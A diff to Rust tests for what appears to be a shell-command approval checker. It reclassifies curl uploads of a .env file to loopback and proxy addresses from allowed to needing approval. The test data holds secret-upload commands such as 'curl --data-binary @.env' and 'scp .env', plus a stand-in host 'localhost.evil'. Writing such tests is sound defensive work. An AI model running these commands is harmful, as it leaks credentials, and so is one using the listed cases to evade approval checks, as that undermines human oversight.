@@ -104,12 +104,16 @@ fn explicit_loopback_uploads_include_sensitive_data() {
         "rsync -a cache/file.txt 127.12.3.4:/backup",
         "rsync -a cache/file.txt '[::1]:/backup'",
         "scp .env localhost:/backup",
-        "curl --data-binary @.env http://127.0.0.1:8765/",
-        "curl --data-binary @.env http://[::1]:8765/",
-        "curl --data SAFE http://localhost/",
         "curl -H @.env http://localhost/",
     ] {
         check(command, Decision::Allow, false);
+    }
+    for command in [
+        "curl --data-binary @.env http://127.0.0.1:8765/",
+        "curl --data-binary @.env http://[::1]:8765/",
+        "curl --data SAFE http://localhost/",
+    ] {
+        check(command, Decision::NeedApproval, false);
     }
     for command in [
         "curl --data SAFE http://localhost.evil/",
@@ -148,13 +152,17 @@ fn explicit_transports_do_not_turn_remote_uploads_into_local_exemptions() {
         check(command, Decision::NeedApproval, true);
     }
     for command in [
-        "curl --proxy http://localhost:8080 --data-binary @.env http://127.0.0.1/",
-        "curl --proxy localhost:8080 --data SAFE http://localhost/",
-        "curl --proxy '' --data SAFE http://localhost/",
         "curl --proxy http://outside.test:8080 http://localhost/",
         "curl --proxy http://outside.test:8080 https://example.test/",
     ] {
         check(command, Decision::Allow, false);
+    }
+    for command in [
+        "curl --proxy http://localhost:8080 --data-binary @.env http://127.0.0.1/",
+        "curl --proxy localhost:8080 --data SAFE http://localhost/",
+        "curl --proxy '' --data SAFE http://localhost/",
+    ] {
+        check(command, Decision::NeedApproval, false);
     }
 }
 
